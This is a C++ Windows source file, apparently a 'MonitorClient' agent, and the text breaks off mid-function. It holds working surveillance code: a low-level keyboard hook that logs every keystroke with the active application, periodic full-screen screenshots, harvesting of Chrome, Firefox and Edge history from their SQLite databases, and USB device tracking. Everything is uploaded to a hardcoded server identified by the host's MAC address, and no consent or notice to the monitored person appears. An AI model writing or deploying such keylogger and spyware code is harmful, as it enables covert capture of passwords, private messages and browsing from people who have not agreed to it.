#include <windows.h>
#include <wininet.h>
// MinGW compatibility patch
#ifndef _OBJIDL_H_
#include <objidl.h>
#endif
#ifndef _PROPID_DEFINED
#define _PROPID_DEFINED
typedef ULONG PROPID;
#endif
#include <gdiplus.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <setupapi.h>
#include <devguid.h>
#include <regstr.h>
#include <shlobj.h>
#include <sqlite3.h>
#include <json/json.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <map>
#include <mutex>
#include <set>
#include <algorithm> // for std::replace
#include <iomanip>   // for std::put_time
#include <iphlpapi.h> // for GetAdaptersInfo
#include <ShellScalingApi.h>

// USB device notification constants (if not defined in MinGW)
#ifndef DBT_DEVICEARRIVAL
#define DBT_DEVICEARRIVAL 0x8000
#endif
#ifndef DBT_DEVICEREMOVECOMPLETE
#define DBT_DEVICEREMOVECOMPLETE 0x8004
#endif
#ifndef DBT_DEVTYP_DEVICEINTERFACE
#define DBT_DEVTYP_DEVICEINTERFACE 0x00000005
#endif
#ifndef GUID_DEVINTERFACE_USB_DEVICE
DEFINE_GUID(GUID_DEVINTERFACE_USB_DEVICE, 0xA5DCBF10L, 0x6530, 0x11D2, 0x90, 0x1F, 0x00, 0xC0, 0x4F, 0xB9, 0x51, 0xED);
#endif

// Additional USB device GUIDs for better monitoring
#ifndef GUID_DEVINTERFACE_USB_HUB
DEFINE_GUID(GUID_DEVINTERFACE_USB_HUB, 0xF359721BL, 0xA47B, 0x11D5, 0x9C, 0xE8, 0x00, 0x50, 0x56, 0xB8, 0x7F, 0x00);
#endif

#ifndef GUID_DEVINTERFACE_DISK
DEFINE_GUID(GUID_DEVINTERFACE_DISK, 0x53F56307L, 0xB6BF, 0x11D0, 0x94, 0xF2, 0x00, 0xA0, 0xC9, 0x1E, 0xFB, 0x8B);
#endif

#ifndef GUID_DEVINTERFACE_CDROM
DEFINE_GUID(GUID_DEVINTERFACE_CDROM, 0x53F56308L, 0xB6BF, 0x11D0, 0x94, 0xF2, 0x00, 0xA0, 0xC9, 0x1E, 0xFB, 0x8B);
#endif

#ifndef GUID_DEVINTERFACE_KEYBOARD
DEFINE_GUID(GUID_DEVINTERFACE_KEYBOARD, 0x884b96c3L, 0x56ef, 0x11d1, 0xbc, 0x8c, 0x00, 0xa0, 0xc9, 0x14, 0x05, 0xdd);
#endif

#ifndef GUID_DEVINTERFACE_MOUSE
DEFINE_GUID(GUID_DEVINTERFACE_MOUSE, 0x378de44cL, 0x56ef, 0x11d1, 0xbc, 0x8c, 0x00, 0xa0, 0xc9, 0x14, 0x05, 0xdd);
#endif

// Device broadcast structures (if not defined in MinGW)
#ifndef DEV_BROADCAST_HDR
typedef struct _DEV_BROADCAST_HDR {
    DWORD dbch_size;
    DWORD dbch_devicetype;
    DWORD dbch_reserved;
} DEV_BROADCAST_HDR, *PDEV_BROADCAST_HDR;
#endif

#ifndef DEV_BROADCAST_DEVICEINTERFACE
typedef struct _DEV_BROADCAST_DEVICEINTERFACE {
    DWORD dbcc_size;
    DWORD dbcc_devicetype;
    DWORD dbcc_reserved;
    GUID dbcc_classguid;
    char dbcc_name[1];
} DEV_BROADCAST_DEVICEINTERFACE, *PDEV_BROADCAST_DEVICEINTERFACE;
#endif

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "sqlite3.lib")
#pragma comment(lib, "Shcore.lib")

#define SCREEN_INTERVAL 5
#define TIC_INTERVAL 30
#define HISTORY_INTERVAL 120
#define KEY_INTERVAL 60
#define STORAGE_CHECK_INTERVAL 5

// Global variables
std::string macAddress;
int screenInterval = SCREEN_INTERVAL;
double lastBrowserTic = -1;
bool activeRunning = true;
std::vector<Json::Value> keyLogs;
std::vector<Json::Value> usbDeviceLogs;
std::vector<Json::Value> browserHistories;
std::mutex dataMutex;
HHOOK keyboardHook = NULL;
HHOOK mouseHook = NULL;

// Browser history tracking - store last fetch times for each browser
int64_t lastChromeFetch = 0;
int64_t lastFirefoxFetch = 0;
int64_t lastEdgeFetch = 0;

// Log file for debugging
std::ofstream debugLogFile;

// Configuration
std::string API_BASE_URL = "http://192.168.1.45:8924";
std::string API_ROUTE = "/webapi.php";
std::string TIC_ROUTE = "/eventhandler.php";
std::string APP_VERSION = "1.0";

// USB monitoring using WMI
std::thread usbMonitoringThread;
bool usbMonitoringActive = false;

// Structure for browser history
struct BrowserHistoryEntry {
    std::string date;
    std::string url;
    std::string title;
};

// Structure for key log
struct KeyLogEntry {
    std::string date;
    std::string application;
    std::string key;
};

// Structure for USB device log
struct USBDeviceEntry {
    std::string date;
    std::string device;
    std::string action;
};

// Function declarations
std::string getMacAddress();
std::string getCurrentDateTimeString();
std::string getActiveWindowTitle();
std::string getKeyName(DWORD vkCode, DWORD scanCode, DWORD flags);
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
void takeScreenshot(const std::string& filePath);
bool sendScreenshot(const std::string& filePath);
bool sendTicEvent();
bool sendBrowserHistories();
bool sendKeyLogs();
bool sendUSBLogs();
void collectBrowserHistory();
void setupKeyboardHook();
void removeKeyboardHook();
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
void setupUSBMONITORING();
void cleanupUSBMONITORING();
std::string httpPost(const std::string& url, const std::string& data);
std::string httpPostFile(const std::string& url, const std::string& filePath);
std::string getChromeHistory(int64_t sinceTime = 0);
std::string getFirefoxHistory(int64_t sinceTime = 0);
std::string getEdgeHistory(int64_t sinceTime = 0);
void monitorTask();
void writeDebugLog(const std::string& message);

// Setup USB monitoring
void setupUSBMONITORING() {
    writeDebugLog("Starting USB monitoring setup...");
    
    usbMonitoringActive = true;
    usbMonitoringThread = std::thread([]() {
        writeDebugLog("USB monitoring thread started");
        
        std::set<std::string> knownDevices;
        int loopCount = 0;
        
        while (usbMonitoringActive) {
            loopCount++;
            writeDebugLog("USB monitoring loop iteration: " + std::to_string(loopCount));
            
            // Get current USB devices - enumerate all devices and filter for USB
            std::set<std::string> currentDevices;
            
            // Enumerate all devices
            HDEVINFO deviceInfoSet = SetupDiGetClassDevsA(&GUID_DEVCLASS_USB, NULL, NULL, DIGCF_PRESENT);
            if (deviceInfoSet != INVALID_HANDLE_VALUE) {
                writeDebugLog("USB devices info set created successfully");
                
                SP_DEVINFO_DATA deviceInfoData;
                deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
                
                DWORD deviceIndex = 0;
                while (SetupDiEnumDeviceInfo(deviceInfoSet, deviceIndex, &deviceInfoData)) {
                    // Get device ID
                    char deviceId[256] = {0};
                    if (SetupDiGetDeviceInstanceIdA(deviceInfoSet, &deviceInfoData, deviceId, sizeof(deviceId), NULL)) {
                        std::string deviceIdStr = deviceId;
                        
                        currentDevices.insert(deviceIdStr);
                        writeDebugLog("Found USB device: " + deviceIdStr);
                        
                        // Check if this is a new device
                        if (knownDevices.find(deviceIdStr) == knownDevices.end()) {
                            // New device connected
                            std::string deviceName = "USB Device";
                            
                            // Try to get friendly name
                            char friendlyName[256] = {0};
                            if (SetupDiGetDeviceRegistryPropertyA(deviceInfoSet, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)friendlyName, sizeof(friendlyName), NULL)) {
                                deviceName = friendlyName;
                            } else {
                                char deviceDesc[256] = {0};
                                if (SetupDiGetDeviceRegistryPropertyA(deviceInfoSet, &deviceInfoData, SPDRP_DEVICEDESC, NULL, (PBYTE)deviceDesc, sizeof(deviceDesc), NULL)) {
                                    deviceName = deviceDesc;
                                }
                            }
                            
                            Json::Value usbLog;
                            usbLog["date"] = getCurrentDateTimeString();
                            usbLog["device_name"] = deviceName;
                            usbLog["device_path"] = deviceIdStr;
                            usbLog["device_type"] = "USB Device";
                            usbLog["action"] = "Connected";
                            
                            writeDebugLog("USB Device Connected: " + deviceName + " (" + deviceIdStr + ")");
                            
                            std::lock_guard<std::mutex> lock(dataMutex);
                            usbDeviceLogs.push_back(usbLog);
                        }
                    }
                    deviceIndex++;
                }
                
                writeDebugLog("Total USB devices found: " + std::to_string(currentDevices.size()));
                SetupDiDestroyDeviceInfoList(deviceInfoSet);
            } else {
                writeDebugLog("Failed to create device info set. Error: " + std::to_string(GetLastError()));
            }
            
            // Check for disconnected devices
            for (const auto& device : knownDevices) {
                if (currentDevices.find(device) == currentDevices.end()) {
                    // Device disconnected
                    Json::Value usbLog;
                    usbLog["date"] = getCurrentDateTimeString();
                    usbLog["device_name"] = "USB Device";
                    usbLog["device_path"] = device;
                    usbLog["device_type"] = "USB Device";
                    usbLog["action"] = "Disconnected";
                    
                    writeDebugLog("USB Device Disconnected: " + device);
                    
                    std::lock_guard<std::mutex> lock(dataMutex);
                    usbDeviceLogs.push_back(usbLog);
                }
            }
            
            knownDevices = currentDevices;
            
            // Sleep for 2 seconds before next check
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
        
        writeDebugLog("USB monitoring thread stopped");
    });
    
    writeDebugLog("USB monitoring setup completed");
}

// Cleanup USB monitoring
void cleanupUSBMONITORING() {
    writeDebugLog("Cleaning up USB monitoring...");
    
    usbMonitoringActive = false;
    
    if (usbMonitoringThread.joinable()) {
        usbMonitoringThread.join();
    }
    
    writeDebugLog("USB monitoring cleanup completed");
}

// Get MAC address
std::string getMacAddress() {
    std::string macAddress;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    
    if (pAdapterInfo == NULL) {
        return "";
    }
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            if (pAdapter->Type == MIB_IF_TYPE_ETHERNET) {
                char mac[18];
                sprintf_s(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
                    pAdapter->Address[0], pAdapter->Address[1],
                    pAdapter->Address[2], pAdapter->Address[3],
                    pAdapter->Address[4], pAdapter->Address[5]);
                macAddress = std::string(mac);
                break;
            }
            pAdapter = pAdapter->Next;
        }
    }
    
    free(pAdapterInfo);
    return macAddress;
}

// Get current date time string
std::string getCurrentDateTimeString() {
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

// Get active window title
std::string getActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (hwnd == NULL) return "Unknown";
    
    char windowTitle[256];
    GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
    
    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);
    
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess != NULL) {
        char processName[MAX_PATH];
        if (GetModuleBaseNameA(hProcess, NULL, processName, sizeof(processName)) > 0) {
            CloseHandle(hProcess);
            return std::string(processName) + " (" + std::string(windowTitle) + ")";
        }
        CloseHandle(hProcess);
    }
    
    return std::string(windowTitle);
}

// Get key name from virtual key code
std::string getKeyName(DWORD vkCode, DWORD scanCode, DWORD flags) {
    char keyName[256];
    UINT scanCodeMap = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    
    if (GetKeyNameTextA(scanCodeMap << 16, keyName, sizeof(keyName)) > 0) {
        return std::string(keyName);
    }
    
    // Fallback for common keys
    switch (vkCode) {
        case VK_RETURN: return "Enter";
        case VK_ESCAPE: return "Escape";
        case VK_TAB: return "Tab";
        case VK_SPACE: return "Space";
        case VK_BACK: return "Backspace";
        case VK_DELETE: return "Delete";
        case VK_INSERT: return "Insert";
        case VK_HOME: return "Home";
        case VK_END: return "End";
        case VK_PRIOR: return "Page Up";
        case VK_NEXT: return "Page Down";
        case VK_LEFT: return "Left";
        case VK_RIGHT: return "Right";
        case VK_UP: return "Up";
        case VK_DOWN: return "Down";
        case VK_F1: return "F1";
        case VK_F2: return "F2";
        case VK_F3: return "F3";
        case VK_F4: return "F4";
        case VK_F5: return "F5";
        case VK_F6: return "F6";
        case VK_F7: return "F7";
        case VK_F8: return "F8";
        case VK_F9: return "F9";
        case VK_F10: return "F10";
        case VK_F11: return "F11";
        case VK_F12: return "F12";
        default: return "Key" + std::to_string(vkCode);
    }
}

// Move GetEncoderClsid declaration up
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);

// Take screenshot
void takeScreenshot(const std::string& filePath) {
    // Get the desktop window handle
    HWND hDesktop = GetDesktopWindow();
    
    // Get the desktop DC
    HDC hdcScreen = GetDC(hDesktop);
    HDC hdcMemory = CreateCompatibleDC(hdcScreen);
    
    // Get the desktop dimensions (now DPI-aware)
    RECT desktopRect;
    GetWindowRect(hDesktop, &desktopRect);
    
    int captureWidth = desktopRect.right - desktopRect.left;
    int captureHeight = desktopRect.bottom - desktopRect.top;
    
    writeDebugLog("Desktop dimensions: " + std::to_string(captureWidth) + "x" + std::to_string(captureHeight));
    
    // Create a bitmap at the correct resolution
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, captureWidth, captureHeight);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMemory, hbmScreen);
    
    // Capture the entire desktop
    BitBlt(hdcMemory, 0, 0, captureWidth, captureHeight, hdcScreen, 0, 0, SRCCOPY);
    
    // Save to file using GDI+ with optimized compression
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromHBITMAP(hbmScreen, NULL);
    
    // Use JPEG encoder for better compression instead of PNG
    CLSID jpegClsid;
    GetEncoderClsid(L"image/jpeg", &jpegClsid);
    
    // Set JPEG quality parameters for smaller file size
    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    
    // Set quality to 70% (good balance between quality and size)
    ULONG quality = 70;
    encoderParams.Parameter[0].Value = &quality;
    
    std::wstring wFilePath(filePath.begin(), filePath.end());
    // Change extension to .jpg for JPEG format
    std::wstring jpgPath = wFilePath.substr(0, wFilePath.find_last_of(L'.')) + L".jpg";
    
    bmp->Save(jpgPath.c_str(), &jpegClsid, &encoderParams);
    
    delete bmp;
    Gdiplus::GdiplusShutdown(gdiplusToken);
    
    SelectObject(hdcMemory, hbmOld);
    DeleteObject(hbmScreen);
    DeleteDC(hdcMemory);
    ReleaseDC(NULL, hdcScreen);
}

// Move GetEncoderClsid definition above takeScreenshot
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

// Send screenshot to server
bool sendScreenshot(const std::string& filePath) {
    std::string url = API_BASE_URL + API_ROUTE;
    std::string response = httpPostFile(url, filePath);
    
    // Parse response
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            if (root.isMember("Interval")) {
                screenInterval = root["Interval"].asInt();
            }
            return true;
        }
    }
    
    return false;
}

// Send tic event
bool sendTicEvent() {
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "Tic";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            if (root.isMember("LastBrowserTic")) {
                lastBrowserTic = root["LastBrowserTic"].asDouble();
            }
            return true;
        }
    }
    
    return false;
}

// Send browser histories
bool sendBrowserHistories() {
    if (browserHistories.empty()) return true;
    
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "BrowserHistory";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["BrowserHistories"] = Json::Value(Json::arrayValue);
    
    for (const auto& history : browserHistories) {
        data["BrowserHistories"].append(history);
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            std::lock_guard<std::mutex> lock(dataMutex);
            browserHistories.clear();
            return true;
        }
    }
    
    return false;
}

// Send key logs
bool sendKeyLogs() {
    if (keyLogs.empty()) return true;
    
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "KeyLog";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["KeyLogs"] = Json::Value(Json::arrayValue);
    
    for (const auto& keyLog : keyLogs) {
        data["KeyLogs"].append(keyLog);
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            std::lock_guard<std::mutex> lock(dataMutex);
            keyLogs.clear();
            return true;
        }
    }
    
    return false;
}

// Send USB logs
bool sendUSBLogs() {
    if (usbDeviceLogs.empty()) return true;
    
    std::cout << "Sending " << usbDeviceLogs.size() << " USB logs" << std::endl;
    
    // Write to log file
    writeDebugLog("Sending " + std::to_string(usbDeviceLogs.size()) + " USB logs to server");
    
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "USBLog";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["USBLogs"] = Json::Value(Json::arrayValue);
    
    for (const auto& usbLog : usbDeviceLogs) {
        data["USBLogs"].append(usbLog);
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::cout << "USB Log JSON: " << jsonData << std::endl;
    
    std::string response = httpPost(url, jsonData);
    
    std::cout << "USB Log Response: " << response << std::endl;
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            std::lock_guard<std::mutex> lock(dataMutex);
            usbDeviceLogs.clear();
            return true;
        }
    }
    
    return false;
}

// HTTP POST request
std::string httpPost(const std::string& url, const std::string& data) {
    HINTERNET hInternet = InternetOpenA("MonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";
    
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }
    
    // Set headers
    std::string headers = "Content-Type: application/json\r\n";
    HttpAddRequestHeadersA(hConnect, headers.c_str(), headers.length(), HTTP_ADDREQ_FLAG_ADD);
    
    // Send request
    BOOL result = HttpSendRequestA(hConnect, NULL, 0, (LPVOID)data.c_str(), data.length());
    
    std::string response;
    if (result) {
        char buffer[1024];
        DWORD bytesRead;
        while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            response += buffer;
        }
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return response;
}

// HTTP POST file upload
std::string httpPostFile(const std::string& url, const std::string& filePath) {
    HINTERNET hInternet = InternetOpenA("MonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";
    
    // Parse URL to get host and path
    URL_COMPONENTSA urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = -1;
    urlComp.dwHostNameLength = -1;
    urlComp.dwUrlPathLength = -1;
    
    if (!InternetCrackUrlA(url.c_str(), 0, 0, &urlComp)) {
        InternetCloseHandle(hInternet);
        return "";
    }
    
    std::string hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    
    // Connect to host
    HINTERNET hConnect = InternetConnectA(hInternet, hostName.c_str(), 
                                        urlComp.nPort == INTERNET_INVALID_PORT_NUMBER ? INTERNET_DEFAULT_HTTP_PORT : urlComp.nPort,
                                        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }
    
    // Read file
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }
    
    std::string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    // Create multipart form data
    std::string boundary = "----WebKitFormBoundary" + std::to_string(GetTickCount());
    std::string contentType = "multipart/form-data; boundary=" + boundary;
    
    std::string formData = "--" + boundary + "\r\n";
    formData += "Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"" + filePath + "\"\r\n";
    formData += "Content-Type: image/png\r\n\r\n";
    formData += fileContent + "\r\n";
    formData += "--" + boundary + "--\r\n";
    
    // Create HTTP request
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath.c_str(), NULL, NULL, NULL, 
                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }
    
    // Set headers
    std::string headers = "Content-Type: " + contentType + "\r\n";
    HttpAddRequestHeadersA(hRequest, headers.c_str(), headers.length(), HTTP_ADDREQ_FLAG_ADD);
    
    // Send request
    BOOL result = HttpSendRequestA(hRequest, NULL, 0, (LPVOID)formData.c_str(), formData.length());
    
    std::string response;
    if (result) {
        char buffer[1024];
        DWORD bytesRead;
        while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            response += buffer;
        }
    }
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return response;
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
            
            std::string application = getActiveWindowTitle();
            std::string keyName = getKeyName(kbStruct->vkCode, kbStruct->scanCode, kbStruct->flags);
            std::string timestamp = getCurrentDateTimeString();
            
            // Check for modifier keys
            std::string modifiers;
            if (GetAsyncKeyState(VK_CONTROL) & 0x8000) modifiers += "Ctrl+";
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) modifiers += "Shift+";
            if (GetAsyncKeyState(VK_MENU) & 0x8000) modifiers += "Alt+";
            if (GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000) modifiers += "Win+";
            
            std::string fullKeyName = modifiers + keyName;
            
            Json::Value keyLog;
            keyLog["date"] = timestamp;
            keyLog["application"] = application;
            keyLog["key"] = fullKeyName;
            
            std::lock_guard<std::mutex> lock(dataMutex);
            keyLogs.push_back(keyLog);
        }
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Setup keyboard hook
void setupKeyboardHook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardHook) {
        std::cerr << "Failed to set keyboard hook" << std::endl;
    }
}

// Remove keyboard hook
void removeKeyboardHook() {
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }
}

// Collect browser history
void collectBrowserHistory() {
    // Chrome history
    std::string chromeHistory = getChromeHistory(lastChromeFetch);
    if (!chromeHistory.empty()) {
        Json::Value historyArray;
        Json::Reader reader;
        if (reader.parse(chromeHistory, historyArray)) {
            int64_t maxTime = lastChromeFetch;
            for (const auto& entry : historyArray) {
                Json::Value history;
                history["browser"] = "Chrome";
                history["url"] = entry["url"];
                history["title"] = entry["title"];
                history["last_visit"] = entry["last_visit"];
                history["date"] = getCurrentDateTimeString();
                
                // Track the latest time we've seen
                int64_t visitTime = entry["last_visit"].asInt64();
                if (visitTime > maxTime) {
                    maxTime = visitTime;
                }
                
                std::lock_guard<std::mutex> lock(dataMutex);
                browserHistories.push_back(history);
            }
            // Update the last fetch time
            if (maxTime > lastChromeFetch) {
                lastChromeFetch = maxTime;
                writeDebugLog("Updated Chrome last fetch time to: " + std::to_string(lastChromeFetch));
            }
        }
    }
    
    // Firefox history
    std::string firefoxHistory = getFirefoxHistory(lastFirefoxFetch);
    if (!firefoxHistory.empty()) {
        Json::Value historyArray;
        Json::Reader reader;
        if (reader.parse(firefoxHistory, historyArray)) {
            int64_t maxTime = lastFirefoxFetch;
            for (const auto& entry : historyArray) {
                Json::Value history;
                history["browser"] = "Firefox";
                history["url"] = entry["url"];
                history["title"] = entry["title"];
                history["last_visit"] = entry["last_visit"];
                history["date"] = getCurrentDateTimeString();
                
                // Track the latest time we've seen
                int64_t visitTime = entry["last_visit"].asInt64();
                if (visitTime > maxTime) {
                    maxTime = visitTime;
                }
                
                std::lock_guard<std::mutex> lock(dataMutex);
                browserHistories.push_back(history);
            }
            // Update the last fetch time
            if (maxTime > lastFirefoxFetch) {
                lastFirefoxFetch = maxTime;
                writeDebugLog("Updated Firefox last fetch time to: " + std::to_string(lastFirefoxFetch));
            }
        }
    }
    
    // Edge history
    std::string edgeHistory = getEdgeHistory(lastEdgeFetch);
    if (!edgeHistory.empty()) {
        Json::Value historyArray;
        Json::Reader reader;
        if (reader.parse(edgeHistory, historyArray)) {
            int64_t maxTime = lastEdgeFetch;
            for (const auto& entry : historyArray) {
                Json::Value history;
                history["browser"] = "Edge";
                history["url"] = entry["url"];
                history["title"] = entry["title"];
                history["last_visit"] = entry["last_visit"];
                history["date"] = getCurrentDateTimeString();
                
                // Track the latest time we've seen
                int64_t visitTime = entry["last_visit"].asInt64();
                if (visitTime > maxTime) {
                    maxTime = visitTime;
                }
                
                std::lock_guard<std::mutex> lock(dataMutex);
                browserHistories.push_back(history);
            }
            // Update the last fetch time
            if (maxTime > lastEdgeFetch) {
                lastEdgeFetch = maxTime;
                writeDebugLog("Updated Edge last fetch time to: " + std::to_string(lastEdgeFetch));
            }
        }
    }
}

// Get Chrome history
std::string getChromeHistory(int64_t sinceTime) {
#ifdef _MSC_VER
    char* localAppData;
    size_t len;
    _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
    if (!localAppData) return "";
    std::string chromePath = std::string(localAppData) + "\\Google\\Chrome\\User Data\\Default\\History";
    free(localAppData);
#else
    const char* localAppData = getenv("LOCALAPPDATA");
    if (!localAppData) return "";
    std::string chromePath = std::string(localAppData) + "\\Google\\Chrome\\User Data\\Default\\History";
#endif
    
    // Create a temporary copy of the database to avoid locking issues
    std::string tempPath = "temp_chrome_history.db";
    if (!CopyFileA(chromePath.c_str(), tempPath.c_str(), FALSE)) {
        // If copy fails, try to access the original
        tempPath = chromePath;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
        return "";
    }
    
    std::string query;
    if (sinceTime > 0) {
        query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time > " + std::to_string(sinceTime) + " ORDER BY last_visit_time DESC LIMIT 100";
        writeDebugLog("Chrome query with sinceTime: " + std::to_string(sinceTime));
    } else {
        query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
        writeDebugLog("Chrome query without sinceTime (first run)");
    }
    sqlite3_stmt* stmt;
    
    Json::Value historyArray(Json::arrayValue);
    
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Json::Value entry;
            const char* url = (char*)sqlite3_column_text(stmt, 0);
            const char* title = (char*)sqlite3_column_text(stmt, 1);
            
            if (url && title) {
                entry["url"] = url;
                entry["title"] = title;
                entry["last_visit"] = sqlite3_column_int64(stmt, 2);
                historyArray.append(entry);
            }
        }
        sqlite3_finalize(stmt);
    }
    
    sqlite3_close(db);
    
    // Clean up temporary file
    if (tempPath != chromePath) {
        DeleteFileA(tempPath.c_str());
    }
    
    Json::FastWriter writer;
    return writer.write(historyArray);
}

// Get Firefox history
std::string getFirefoxHistory(int64_t sinceTime) {
#ifdef _MSC_VER
    char* appData;
    size_t len;
    _dupenv_s(&appData, &len, "APPDATA");
    if (!appData) return "";
    std::string firefoxPath = std::string(appData) + "\\Mozilla\\Firefox\\Profiles";
    free(appData);
#else
    const char* appData = getenv("APPDATA");
    if (!appData) return "";
